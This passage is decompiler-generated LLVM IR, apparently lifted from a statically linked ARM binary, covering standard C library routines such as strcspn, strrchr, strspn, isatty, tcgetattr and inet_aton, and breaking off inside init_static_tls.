  %v2_19228 = icmp eq i8 %v2_1921c, 0
  br i1 %v2_19228, label %dec_label_pc_192ec, label %dec_label_pc_19230

dec_label_pc_19230:                               ; preds = %dec_label_pc_19228
  %v1_19230 = add i32 %v0_19230, 1
  %v1_19234 = urem i32 %v1_19230, 4
  %v2_19234 = icmp eq i32 %v1_19234, 0
  br i1 %v2_19234, label %dec_label_pc_1923c, label %dec_label_pc_1921c

dec_label_pc_1923c:                               ; preds = %dec_label_pc_19230, %entry
  %v0_19240 = phi i32 [ %v0_192342, %entry ], [ %v1_19230, %dec_label_pc_19230 ]
  %v4_1923c = mul nuw nsw i32 %v1_19214, 256
  %v5_1923c = or i32 %v4_1923c, %v1_19214
  %v4_19244 = mul i32 %v5_1923c, 65536
  %v5_19244 = or i32 %v4_19244, %v5_1923c
  br label %dec_label_pc_19248

dec_label_pc_19248:                               ; preds = %dec_label_pc_192e4, %dec_label_pc_19284, %dec_label_pc_1923c
  %v0_192ac = phi i32 [ %v0_19240, %dec_label_pc_1923c ], [ %v4_19248, %dec_label_pc_19284 ], [ %v4_19248, %dec_label_pc_192e4 ]
  %v1_19248 = inttoptr i32 %v0_192ac to i32*
  %v2_19248 = load i32, i32* %v1_19248, align 4
  %v4_19248 = add i32 %v0_192ac, 4
  %v2_19250 = xor i32 %v2_19248, %v5_19244
  %v2_1925c = add i32 %v2_19248, 2130640639
  %v1_19260 = sub i32 -1, %v2_19248
  %v2_19264 = xor i32 %v2_1925c, %v1_19260
  %v2_19270 = and i32 %v2_19264, -2130640640
  store i32 %v2_19270, i32* @r1, align 4
  %v2_19278 = icmp eq i32 %v2_19270, 0
  br i1 %v2_19278, label %dec_label_pc_19284, label %dec_label_pc_1928c

dec_label_pc_19284:                               ; preds = %dec_label_pc_19248
  %v2_19254 = add i32 %v2_19250, 2130640639
  %v1_1926c = sub i32 -1, %v2_19250
  %v2_19274 = xor i32 %v2_19254, %v1_1926c
  %v2_1927c = and i32 %v2_19274, -2130640640
  %v2_19284 = icmp eq i32 %v2_1927c, 0
  br i1 %v2_19284, label %dec_label_pc_19248, label %dec_label_pc_1928c

dec_label_pc_1928c:                               ; preds = %dec_label_pc_19248, %dec_label_pc_19284
  %v2_1928c = inttoptr i32 %v0_192ac to i8*
  %v3_1928c = load i8, i8* %v2_1928c, align 1
  %v4_1928c = zext i8 %v3_1928c to i32
  %v9_19290 = icmp eq i32 %v4_1928c, %v1_19214
  br i1 %v9_19290, label %dec_label_pc_192ec, label %dec_label_pc_1929c

dec_label_pc_1929c:                               ; preds = %dec_label_pc_1928c
  %v2_1929c = icmp eq i8 %v3_1928c, 0
  br i1 %v2_1929c, label %dec_label_pc_192ec, label %dec_label_pc_192a4

dec_label_pc_192a4:                               ; preds = %dec_label_pc_1929c
  %v1_192a4 = add i32 %v0_192ac, 1
  %v2_192a4 = inttoptr i32 %v1_192a4 to i8*
  %v3_192a4 = load i8, i8* %v2_192a4, align 1
  %v4_192a4 = zext i8 %v3_192a4 to i32
  %v9_192a8 = icmp eq i32 %v4_192a4, %v1_19214
  br i1 %v9_192a8, label %dec_label_pc_192ec, label %dec_label_pc_192b4

dec_label_pc_192b4:                               ; preds = %dec_label_pc_192a4
  %v2_192b4 = icmp eq i8 %v3_192a4, 0
  br i1 %v2_192b4, label %dec_label_pc_192ec, label %dec_label_pc_192bc

dec_label_pc_192bc:                               ; preds = %dec_label_pc_192b4
  %v1_192bc = add i32 %v0_192ac, 2
  %v2_192bc = inttoptr i32 %v1_192bc to i8*
  %v3_192bc = load i8, i8* %v2_192bc, align 1
  %v4_192bc = zext i8 %v3_192bc to i32
  %v9_192c0 = icmp eq i32 %v4_192bc, %v1_19214
  br i1 %v9_192c0, label %dec_label_pc_192ec, label %dec_label_pc_192cc

dec_label_pc_192cc:                               ; preds = %dec_label_pc_192bc
  %v2_192cc = icmp eq i8 %v3_192bc, 0
  br i1 %v2_192cc, label %dec_label_pc_192ec, label %dec_label_pc_192d4

dec_label_pc_192d4:                               ; preds = %dec_label_pc_192cc
  %v1_192d4 = add i32 %v0_192ac, 3
  %v2_192d4 = inttoptr i32 %v1_192d4 to i8*
  %v3_192d4 = load i8, i8* %v2_192d4, align 1
  %v4_192d4 = zext i8 %v3_192d4 to i32
  %v9_192d8 = icmp eq i32 %v4_192d4, %v1_19214
  br i1 %v9_192d8, label %dec_label_pc_192ec, label %dec_label_pc_192e4

dec_label_pc_192e4:                               ; preds = %dec_label_pc_192d4
  %v2_192e4 = icmp eq i8 %v3_192d4, 0
  br i1 %v2_192e4, label %dec_label_pc_192ec, label %dec_label_pc_19248

dec_label_pc_192ec:                               ; preds = %dec_label_pc_19228, %dec_label_pc_1921c, %dec_label_pc_192e4, %dec_label_pc_192d4, %dec_label_pc_192cc, %dec_label_pc_192bc, %dec_label_pc_192b4, %dec_label_pc_192a4, %dec_label_pc_1929c, %dec_label_pc_1928c
  %v1_192f0 = phi i32 [ %v1_192d4, %dec_label_pc_192e4 ], [ %v1_192d4, %dec_label_pc_192d4 ], [ %v1_192bc, %dec_label_pc_192cc ], [ %v1_192bc, %dec_label_pc_192bc ], [ %v1_192a4, %dec_label_pc_192b4 ], [ %v1_192a4, %dec_label_pc_192a4 ], [ %v0_192ac, %dec_label_pc_1929c ], [ %v0_192ac, %dec_label_pc_1928c ], [ %v0_19230, %dec_label_pc_1921c ], [ %v0_19230, %dec_label_pc_19228 ]
  ret i32 %v1_192f0

; uselistorder directives
  uselistorder i32 %v4_19248, { 1, 0 }
  uselistorder i32 %v2_19248, { 0, 2, 1 }
  uselistorder i32 %v0_192ac, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_1923c, { 1, 0 }
  uselistorder i32 %v1_19230, { 1, 0, 2 }
  uselistorder i32 %v0_192342, { 2, 1, 0 }
  uselistorder i32 %v1_19214, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 2130640639, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_192ec, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_1928c, { 1, 0 }
  uselistorder label %dec_label_pc_1921c, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_192fc = load i32, i32* @r4, align 4
  store i32 %v3_192fc, i32* %stack_var_-16, align 4
  %v6_192fc = load i32, i32* @r5, align 4
  %v9_192fc = load i32, i32* @r6, align 4
  %v0_19300 = load i32, i32* @r0, align 4
  %v0_19304 = load i32, i32* @r1, align 4
  store i32 %v0_19304, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_193208 = inttoptr i32 %v0_19300 to i8*
  %v2_193209 = load i8, i8* %v1_193208, align 1
  %v3_1932010 = zext i8 %v2_193209 to i32
  store i32 %v3_1932010, i32* @r1, align 4
  %v2_1932411 = icmp eq i8 %v2_193209, 0
  store i32 %v0_19304, i32* @r0, align 4
  %v1_1932c12 = add i32 %v0_19300, 1
  store i32 %v1_1932c12, i32* @r4, align 4
  br i1 %v2_1932411, label %dec_label_pc_19334, label %dec_label_pc_19310

dec_label_pc_19310:                               ; preds = %entry, %dec_label_pc_1931c
  %v3_1932014 = phi i32 [ %v3_19320, %dec_label_pc_1931c ], [ %v3_1932010, %entry ]
  %v0_1932813 = phi i32 [ %v0_19328.pre, %dec_label_pc_1931c ], [ %v0_19304, %entry ]
  %v2_19310 = call i32 @__GI_strchr(i32 %v0_1932813, i32 %v3_1932014)
  %v2_19314 = icmp eq i32 %v2_19310, 0
  %v0_1931c = load i32, i32* @r5, align 4
  br i1 %v2_19314, label %dec_label_pc_1931c, label %dec_label_pc_19334

dec_label_pc_1931c:                               ; preds = %dec_label_pc_19310
  %v1_1931c = add i32 %v0_1931c, 1
  %v0_19320.pre = load i32, i32* @r4, align 4
  %v0_19328.pre = load i32, i32* @r6, align 4
  store i32 %v1_1931c, i32* @r5, align 4
  %v1_19320 = inttoptr i32 %v0_19320.pre to i8*
  %v2_19320 = load i8, i8* %v1_19320, align 1
  %v3_19320 = zext i8 %v2_19320 to i32
  store i32 %v3_19320, i32* @r1, align 4
  %v2_19324 = icmp eq i8 %v2_19320, 0
  store i32 %v0_19328.pre, i32* @r0, align 4
  %v1_1932c = add i32 %v0_19320.pre, 1
  store i32 %v1_1932c, i32* @r4, align 4
  br i1 %v2_19324, label %dec_label_pc_19334, label %dec_label_pc_19310

dec_label_pc_19334:                               ; preds = %dec_label_pc_1931c, %dec_label_pc_19310, %entry
  %v0_19334 = phi i32 [ 0, %entry ], [ %v0_1931c, %dec_label_pc_19310 ], [ %v1_1931c, %dec_label_pc_1931c ]
  %v2_19338 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_19338, i32* @r4, align 4
  store i32 %v6_192fc, i32* @r5, align 4
  store i32 %v9_192fc, i32* @r6, align 4
  ret i32 %v0_19334

; uselistorder directives
  uselistorder i32 %v3_19320, { 1, 0 }
  uselistorder i32 %v0_19328.pre, { 1, 0 }
  uselistorder i32 %v0_19320.pre, { 1, 0 }
  uselistorder label %dec_label_pc_19310, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_19344 = urem i32 %arg2, 256
  store i32 %v1_19344, i32* @r4, align 4
  %v2_19344 = icmp eq i32 %v1_19344, 0
  br i1 %v2_19344, label %dec_label_pc_19358, label %dec_label_pc_1936c.preheader

dec_label_pc_1936c.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_193743 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_19344)
  %v2_193785 = icmp eq i32 %v2_193743, 0
  br i1 %v2_193785, label %dec_label_pc_19380, label %dec_label_pc_19364

dec_label_pc_19358:                               ; preds = %entry
  %v2_1935c = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_19384

dec_label_pc_19364:                               ; preds = %dec_label_pc_1936c.preheader, %dec_label_pc_19364
  %v2_193746 = phi i32 [ %v2_19374, %dec_label_pc_19364 ], [ %v2_193743, %dec_label_pc_1936c.preheader ]
  store i32 %v2_193746, i32* @r5, align 4
  %v1_19368 = add i32 %v2_193746, 1
  store i32 %v1_19368, i32* @r0, align 4
  %v0_19370 = load i32, i32* @r4, align 4
  %v2_19374 = call i32 @__GI_strchr(i32 %v1_19368, i32 %v0_19370)
  %v2_19378 = icmp eq i32 %v2_19374, 0
  br i1 %v2_19378, label %dec_label_pc_19380, label %dec_label_pc_19364

dec_label_pc_19380:                               ; preds = %dec_label_pc_19364, %dec_label_pc_1936c.preheader
  %v0_19380 = load i32, i32* @r5, align 4
  br label %dec_label_pc_19384

dec_label_pc_19384:                               ; preds = %dec_label_pc_19358, %dec_label_pc_19380
  %storemerge = phi i32 [ %v2_1935c, %dec_label_pc_19358 ], [ %v0_19380, %dec_label_pc_19380 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_19374, { 1, 0 }
  uselistorder i32 %v1_19368, { 1, 0 }
  uselistorder i32 %v1_19344, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_19384, { 1, 0 }
  uselistorder label %dec_label_pc_19364, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v0_193c02 = load i32, i32* @r0, align 4
  %v1_193c03 = inttoptr i32 %v0_193c02 to i8*
  %v2_193c04 = load i8, i8* %v1_193c03, align 1
  %v2_193c46 = icmp eq i8 %v2_193c04, 0
  br i1 %v2_193c46, label %dec_label_pc_193d0, label %dec_label_pc_193a4.preheader

dec_label_pc_1939c:                               ; preds = %dec_label_pc_193a4
  %v1_193ac = add i32 %v0_193ac, 1
  %v9_1939c = icmp eq i8 %v0_1939c10.in, %v2_193a4
  br i1 %v9_1939c, label %dec_label_pc_193b8, label %dec_label_pc_193a4

dec_label_pc_193a4:                               ; preds = %dec_label_pc_193a4.preheader, %dec_label_pc_1939c
  %v0_193ac = phi i32 [ %tmp, %dec_label_pc_193a4.preheader ], [ %v1_193ac, %dec_label_pc_1939c ]
  %v1_193a4 = inttoptr i32 %v0_193ac to i8*
  %v2_193a4 = load i8, i8* %v1_193a4, align 1
  %v2_193a8 = icmp eq i8 %v2_193a4, 0
  br i1 %v2_193a8, label %dec_label_pc_193d0, label %dec_label_pc_1939c

dec_label_pc_193b8:                               ; preds = %dec_label_pc_1939c
  %v1_193b8 = add i32 %v0_193b8, 1
  %v1_193bc = add i32 %v0_193bc, 1
  %v1_193c0 = inttoptr i32 %v1_193bc to i8*
  %v2_193c0 = load i8, i8* %v1_193c0, align 1
  %v2_193c4 = icmp eq i8 %v2_193c0, 0
  br i1 %v2_193c4, label %dec_label_pc_193d0, label %dec_label_pc_193a4.preheader

dec_label_pc_193a4.preheader:                     ; preds = %entry, %dec_label_pc_193b8
  %v0_193bc = phi i32 [ %v1_193bc, %dec_label_pc_193b8 ], [ %v0_193c02, %entry ]
  %v0_193b8 = phi i32 [ %v1_193b8, %dec_label_pc_193b8 ], [ 0, %entry ]
  %v0_1939c10.in = phi i8 [ %v2_193c0, %dec_label_pc_193b8 ], [ %v2_193c04, %entry ]
  br label %dec_label_pc_193a4

dec_label_pc_193d0:                               ; preds = %dec_label_pc_193b8, %dec_label_pc_193a4, %entry
  %v0_193d0 = phi i32 [ 0, %entry ], [ %v0_193b8, %dec_label_pc_193a4 ], [ %v1_193b8, %dec_label_pc_193b8 ]
  ret i32 %v0_193d0

; uselistorder directives
  uselistorder i8 %v2_193a4, { 1, 0 }
  uselistorder i32 %v0_193ac, { 1, 0 }
  uselistorder label %dec_label_pc_193a4.preheader, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_193e4 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_193e4, i32* @r1, align 4
  %v0_193e8 = call i32 @__GI_tcgetattr()
  %v1_193ec = sub i32 1, %v0_193e8
  %v2_193ec = icmp ult i32 %v0_193e8, 2
  br i1 %v2_193ec, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_193fc = phi i32 [ %v1_193ec, %entry ], [ 0, %bb ]
  ret i32 %v1_193fc

; uselistorder directives
  uselistorder i32 %v0_193e8, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_4()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_19400 = load i32, i32* @r4, align 4
  %v6_19400 = load i32, i32* @r5, align 4
  %v9_19400 = load i32, i32* @r6, align 4
  %v2_19408 = ptrtoint i32* %stack_var_-52 to i32
  %v0_1940c = load i32, i32* @r1, align 4
  store i32 %v0_1940c, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_19418 = load i32, i32* @r0, align 4
  %v3_19418 = call i32 @ioctl(i32 %v0_19418, i32 21505, i32 %v2_19408)
  store i32 %v3_19418, i32* %r0.global-to-local, align 4
  store i32 %v3_19418, i32* @r5, align 4
  %v2_1941c = icmp eq i32 %v3_19418, 0
  br i1 %v2_1941c, label %dec_label_pc_19424, label %dec_label_pc_19468

dec_label_pc_19424:                               ; preds = %entry
  %v4_19430 = zext i8 %tmp to i32
  store i32 %v4_19430, i32* @ip, align 4
  %v3_19434 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_19434, i32* @r3, align 4
  %v1_19438 = load i32, i32* @r4, align 4
  %v2_19438 = add i32 %v1_19438, 4
  %v3_19438 = inttoptr i32 %v2_19438 to i32*
  %v0_1943c = load i32, i32* %r1.global-to-local, align 4
  %v1_1943c = load i32, i32* @r4, align 4
  %v2_1943c = add i32 %v1_1943c, 8
  %v3_1943c = inttoptr i32 %v2_1943c to i32*
  store i32 %v0_1943c, i32* %v3_1943c, align 4
  %v0_19440 = load i32, i32* %r0.global-to-local, align 4
  %v1_19440 = load i32, i32* @r4, align 4
  %v2_19440 = add i32 %v1_19440, 12
  %v3_19440 = inttoptr i32 %v2_19440 to i32*
  store i32 %v0_19440, i32* %v3_19440, align 4
  %v2_19444 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_19444, i32* @r1, align 4
  %v1_1944c = load i32, i32* @r4, align 4
  %v2_1944c = inttoptr i32 %v1_1944c to i32*
  store i32 %v3_19434, i32* %v2_1944c, align 4
  %v0_19450 = load i32, i32* @ip, align 4
  %v1_19450 = trunc i32 %v0_19450 to i8
  %v2_19450 = load i32, i32* @r4, align 4
  %v3_19450 = add i32 %v2_19450, 16
  %v4_19450 = inttoptr i32 %v3_19450 to i8*
  store i8 %v1_19450, i8* %v4_19450, align 1
  %v0_19454 = load i32, i32* @r4, align 4
  %v1_19454 = add i32 %v0_19454, 17
  store i32 %v1_19454, i32* %r0.global-to-local, align 4
  %v4_19458 = call i32 @__GI_mempcpy(i32 %v1_19454, i32 %v2_19444, i32 19, i32 %v3_19434)
  store i32 %v4_19458, i32* %r0.global-to-local, align 4
  %v0_1945c = load i32, i32* @r5, align 4
  store i32 %v0_1945c, i32* %r1.global-to-local, align 4
  %v3_19464 = inttoptr i32 %v4_19458 to i8*
  %v4_19464 = call i32 @__GI_memset(i8* %v3_19464, i32 %v0_1945c, i32 13)
  store i32 %v4_19464, i32* %r0.global-to-local, align 4
  %v0_19468.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19468

dec_label_pc_19468:                               ; preds = %entry, %dec_label_pc_19424
  %v0_19468 = phi i32 [ %v3_19418, %entry ], [ %v0_19468.pre, %dec_label_pc_19424 ]
  store i32 %v0_19468, i32* %r0.global-to-local, align 4
  store i32 %v3_19400, i32* @r4, align 4
  store i32 %v6_19400, i32* @r5, align 4
  store i32 %v9_19400, i32* @r6, align 4
  ret i32 %v0_19468

; uselistorder directives
  uselistorder i32 %v0_19468, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 17, { 10, 1, 2, 11, 12, 3, 13, 4, 14, 5, 15, 16, 17, 6, 18, 7, 8, 19, 9, 20, 21, 22, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19468, { 1, 0 }
}

define i32 @inet_aton() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1947c = load i32, i32* @r4, align 4
  store i32 %v3_1947c, i32* %stack_var_-28, align 4
  %v0_19484 = load i32, i32* @r0, align 4
  %v2_19484 = icmp eq i32 %v0_19484, 0
  %v0_1948c = load i32, i32* @r1, align 4
  br i1 %v2_19484, label %dec_label_pc_19560, label %dec_label_pc_19494

dec_label_pc_19494:                               ; preds = %entry
  br label %dec_label_pc_194ac

dec_label_pc_194ac:                               ; preds = %dec_label_pc_19494, %dec_label_pc_19524
  %v1_19524 = phi i32 [ 0, %dec_label_pc_19494 ], [ %v5_19524, %dec_label_pc_19524 ]
  %v0_19528 = phi i32 [ 1, %dec_label_pc_19494 ], [ %v1_19528, %dec_label_pc_19524 ]
  %v0_194ac = phi i32 [ %v0_19484, %dec_label_pc_19494 ], [ %v0_194ac13, %dec_label_pc_19524 ]
  %v1_194ac = inttoptr i32 %v0_194ac to i8*
  %v2_194ac = load i8, i8* %v1_194ac, align 1
  %v3_194ac = zext i8 %v2_194ac to i32
  %v4_194b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 276) to i32*), align 4
  %v2_194b4 = mul nuw nsw i32 %v3_194ac, 2
  %v2_194b8 = add i32 %v2_194b4, %v4_194b0
  %v3_194b8 = inttoptr i32 %v2_194b8 to i16*
  %v4_194b8 = load i16, i16* %v3_194b8, align 2
  %v1_194bc = and i16 %v4_194b8, 8
  %v2_194bc = icmp eq i16 %v1_194bc, 0
  br i1 %v2_194bc, label %dec_label_pc_19560, label %dec_label_pc_194c4

dec_label_pc_194c4:                               ; preds = %dec_label_pc_194ac
  br label %dec_label_pc_194e4

dec_label_pc_194cc:                               ; preds = %dec_label_pc_194e4
  %v2_194cc = mul i32 %v0_19524, 10
  %v1_194d0 = add i32 %v2_194cc, -48
  %v2_194d4 = add i32 %v3_194e4, %v1_194d0
  %v8_194dc = icmp sgt i32 %v2_194d4, 255
  br i1 %v8_194dc, label %dec_label_pc_19560, label %dec_label_pc_194e0

dec_label_pc_194e0:                               ; preds = %dec_label_pc_194cc
  %v1_194e0 = add i32 %v0_19514, 1
  store i32 %v1_194e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_194e4

dec_label_pc_194e4:                               ; preds = %dec_label_pc_194c4, %dec_label_pc_194e0
  %v0_19524 = phi i32 [ 0, %dec_label_pc_194c4 ], [ %v2_194d4, %dec_label_pc_194e0 ]
  %v0_19514 = phi i32 [ %v0_194ac, %dec_label_pc_194c4 ], [ %v1_194e0, %dec_label_pc_194e0 ]
  %v1_194e4 = inttoptr i32 %v0_19514 to i8*
  %v2_194e4 = load i8, i8* %v1_194e4, align 1
  %v3_194e4 = zext i8 %v2_194e4 to i32
  %v2_194e8 = mul nuw nsw i32 %v3_194e4, 2
  %v2_194ec = add i32 %v2_194e8, %v4_194b0
  %v3_194ec = inttoptr i32 %v2_194ec to i16*
  %v4_194ec = load i16, i16* %v3_194ec, align 2
  %v6_194ec = zext i16 %v4_194ec to i32
  %v1_194f0 = and i32 %v6_194ec, 8
  %v2_194f0 = icmp eq i32 %v1_194f0, 0
  br i1 %v2_194f0, label %dec_label_pc_194f8, label %dec_label_pc_194cc

dec_label_pc_194f8:                               ; preds = %dec_label_pc_194e4
  %v7_194f8 = icmp eq i32 %v0_19528, 4
  br i1 %v7_194f8, label %dec_label_pc_19510, label %dec_label_pc_19500

dec_label_pc_19500:                               ; preds = %dec_label_pc_194f8
  %v7_19500 = icmp eq i8 %v2_194e4, 46
  br i1 %v7_19500, label %dec_label_pc_19508, label %dec_label_pc_19560

dec_label_pc_19508:                               ; preds = %dec_label_pc_19500
  %v1_19508 = add i32 %v0_19514, 1
  store i32 %v1_19508, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19524

dec_label_pc_19510:                               ; preds = %dec_label_pc_194f8
  %v2_19510 = icmp eq i8 %v2_194e4, 0
  %v1_19514 = add i32 %v0_19514, 1
  store i32 %v1_19514, i32* %r0.global-to-local, align 4
  br i1 %v2_19510, label %dec_label_pc_19524, label %dec_label_pc_1951c

dec_label_pc_1951c:                               ; preds = %dec_label_pc_19510
  %v1_1951c = and i32 %v6_194ec, 32
  %v2_1951c = icmp eq i32 %v1_1951c, 0
  br i1 %v2_1951c, label %dec_label_pc_19560, label %dec_label_pc_19524

dec_label_pc_19524:                               ; preds = %dec_label_pc_1951c, %dec_label_pc_19510, %dec_label_pc_19508
  %v0_194ac13 = phi i32 [ %v1_19514, %dec_label_pc_1951c ], [ %v1_19514, %dec_label_pc_19510 ], [ %v1_19508, %dec_label_pc_19508 ]
  %v4_19524 = mul i32 %v1_19524, 256
  %v5_19524 = or i32 %v0_19524, %v4_19524
  %v1_19528 = add nuw nsw i32 %v0_19528, 1
  %v7_19530 = icmp slt i32 %v1_19528, 5
  br i1 %v7_19530, label %dec_label_pc_194ac, label %dec_label_pc_19534

dec_label_pc_19534:                               ; preds = %dec_label_pc_19524
  %v2_19534 = icmp eq i32 %v0_1948c, 0
  br i1 %v2_19534, label %.thread8.thread, label %bb

.thread8.thread:                                  ; preds = %dec_label_pc_19534
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19564

bb:                                               ; preds = %dec_label_pc_19534
  %v4_19538 = udiv i32 %v5_19524, 16777216
  %v2_1953c = udiv i32 %v5_19524, 256
  %v5_19540 = and i32 %v2_1953c, 65280
  %v2_19544 = and i32 %v5_19524, 65280
  %v5_19548 = mul nuw nsw i32 %v2_19544, 256
  %v5_1954c = mul i32 %v0_19524, 16777216
  %v6_19540 = or i32 %v4_19538, %v5_1954c
  %v6_19548 = or i32 %v6_19540, %v5_19540
  %v6_1954c = or i32 %v6_19548, %v5_19548
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_19558 = inttoptr i32 %v0_1948c to i32*
  store i32 %v6_1954c, i32* %v3_19558, align 4
  %v2_19564.pre = load i32, i32* %stack_var_-28, align 4
  %v1_19568.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19564

dec_label_pc_19560:                               ; preds = %dec_label_pc_19500, %dec_label_pc_1951c, %dec_label_pc_194ac, %dec_label_pc_194cc, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19564

dec_label_pc_19564:                               ; preds = %.thread8.thread, %bb, %dec_label_pc_19560
  %v1_19568 = phi i32 [ %v1_19568.pre, %bb ], [ 0, %dec_label_pc_19560 ], [ 1, %.thread8.thread ]
  %v2_19564 = phi i32 [ %v2_19564.pre, %bb ], [ %v3_1947c, %dec_label_pc_19560 ], [ %v3_1947c, %.thread8.thread ]
  store i32 %v2_19564, i32* @r4, align 4
  ret i32 %v1_19568

; uselistorder directives
  uselistorder i32 %v1_19528, { 1, 0 }
  uselistorder i32 %v5_19524, { 2, 0, 1, 3 }
  uselistorder i32 %v0_19514, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 5, 6, 0, 2, 3, 4 }
  uselistorder i32 65280, { 64, 0, 5, 1, 2, 6, 7, 8, 9, 10, 36, 44, 45, 46, 11, 12, 13, 47, 48, 14, 15, 16, 17, 37, 49, 3, 50, 51, 18, 19, 38, 52, 53, 39, 20, 21, 22, 23, 24, 54, 55, 56, 57, 40, 41, 42, 4, 58, 59, 25, 60, 26, 27, 28, 29, 43, 61, 30, 31, 32, 62, 33, 34, 35, 63, 65, 66 }
  uselistorder i8 46, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 255, { 4, 5, 0, 1, 2, 16, 17, 19, 18, 20, 6, 21, 3, 9, 22, 10, 23, 7, 24, 8, 25, 13, 26, 14, 27, 11, 28, 12, 29, 15, 30 }
  uselistorder i16 0, { 0, 1, 3, 4, 5, 2, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder label %dec_label_pc_19564, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19560, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_194e4, { 1, 0 }
  uselistorder label %dec_label_pc_194ac, { 1, 0 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v3_19580 = load i32, i32* @r4, align 4
  store i32 %v3_19580, i32* %stack_var_-16, align 4
  %v4_19584 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 72) to i32*), align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v4_1958c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 60) to i32*), align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_19594 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 36) to i32*), align 4
  store i32 %v4_19594, i32* %r4.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v1_1959c = inttoptr i32 %v4_19584 to i32*
  %v2_1959c = load i32, i32* %v1_1959c, align 4
  %v4_195a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 52) to i32*), align 4
  store i32 %v4_195a0, i32* %lr.global-to-local, align 4
  store i32 144, i32* %r3.global-to-local, align 4
  %v1_195a8 = add i32 %v2_1959c, 15
  %v4_195ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 144) to i32*), align 4
  store i32 %v4_195ac, i32* @ip, align 4
  %v1_195b0 = load i32, i32* @r0, align 4
  %v2_195b0 = add i32 %v1_195b0, %v1_195a8
  %v1_195b4 = inttoptr i32 %v4_1958c to i32*
  %v2_195b4 = load i32, i32* %v1_195b4, align 4
  store i32 %v2_195b4, i32* %r3.global-to-local, align 4
  %v1_195b8 = and i32 %v2_195b0, -16
  store i32 %v1_195b8, i32* %v1_1959c, align 4
  %v0_195c0 = load i32, i32* @r0, align 4
  %v1_195c0 = load i32, i32* %r4.global-to-local, align 4
  %v2_195c0 = inttoptr i32 %v1_195c0 to i32*
  store i32 %v0_195c0, i32* %v2_195c0, align 4
  %v0_195c4 = load i32, i32* @r1, align 4
  %v1_195c4 = load i32, i32* %lr.global-to-local, align 4
  %v2_195c4 = inttoptr i32 %v1_195c4 to i32*
  store i32 %v0_195c4, i32* %v2_195c4, align 4
  %v0_195c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_195c8 = load i32, i32* @ip, align 4
  %v2_195c8 = inttoptr i32 %v1_195c8 to i32*
  store i32 %v0_195c8, i32* %v2_195c8, align 4
  %v2_195cc = load i32, i32* %stack_var_-16, align 4
